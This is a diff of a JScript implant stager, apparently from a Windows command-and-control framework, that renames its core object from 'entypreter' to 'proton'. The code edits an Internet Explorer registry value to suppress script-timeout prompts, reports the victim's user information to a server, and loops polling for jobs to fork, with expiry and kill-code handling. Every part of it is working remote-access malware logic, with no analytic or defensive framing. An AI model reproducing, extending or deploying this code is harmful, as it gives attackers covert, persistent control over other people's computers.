@@ -1,27 +1,27 @@
 try
 {
-    if (entypreter.JOBKEY != "stage")
+    if (proton.JOBKEY != "stage")
     {
-        if (entypreter.isHTA())
+        if (proton.isHTA())
         {
             //HKCU\SOFTWARE\Microsoft\Internet Explorer\Style\MaxScriptStatements = 0xFFFFFFFF
             var path = "SOFTWARE\\Microsoft\\Internet Explorer\\Styles";
             var key = "MaxScriptStatements";
-            entypreter.registry.write(entypreter.registry.HKCU, path, key, 0xFFFFFFFF, entypreter.registry.DWORD);
+            proton.registry.write(proton.registry.HKCU, path, key, 0xFFFFFFFF, proton.registry.DWORD);
         }
 
-        entypreter.work.report(entypreter.user.info());
+        proton.work.report(proton.user.info());
 
         try {
-          entypreter.work.fork("");
+          proton.work.fork("");
         } catch (e) {
-          entypreter.work.error(e)
+          proton.work.error(e)
         }
-        entypreter.exit();
+        proton.exit();
     }
     else
     {
-        if (entypreter.isHTA())
+        if (proton.isHTA())
             DoWorkTimeout();
         else
             DoWorkLoop();
@@ -30,14 +30,14 @@ try
 catch (e)
 {
     // todo: critical error reporting
-    entypreter.work.error(e);
+    proton.work.error(e);
 }
 
 function DoWork()
 {
 
     var epoch = new Date().getTime();
-    var expire = parseInt(entypreter.EXPIRE);
+    var expire = parseInt(proton.EXPIRE);
     if (epoch > expire)
     {
         return false;
@@ -45,14 +45,14 @@ function DoWork()
 
     try
     {
-        var work = entypreter.work.get();
+        var work = proton.work.get();
         // 201 = x64 or x86
         // 202 = force x86
         if (work.status == 201 || work.status == 202)
         {
             if (work.responseText.length > 0) {
                 var jobkey = work.responseText;
-                entypreter.work.fork(jobkey, work.status == 202);
+                proton.work.fork(jobkey, work.status == 202);
             }
         }
         else // if (work.status == 500) // kill code
@@ -73,7 +73,7 @@ function DoWorkLoop()
     while (DoWork())
         ;
 
-    entypreter.exit();
+    proton.exit();
 }
 
 function DoWorkTimeout()
@@ -82,12 +82,12 @@ function DoWorkTimeout()
     {
       if (!DoWork())
       {
-          entypreter.exit();
+          proton.exit();
           return;
       }
     }
     //window.setTimeout(DoWorkTimeoutCallback, 0);
 
-    entypreter.work.fork("");
-    entypreter.exit();
+    proton.work.fork("");
+    proton.exit();
 }
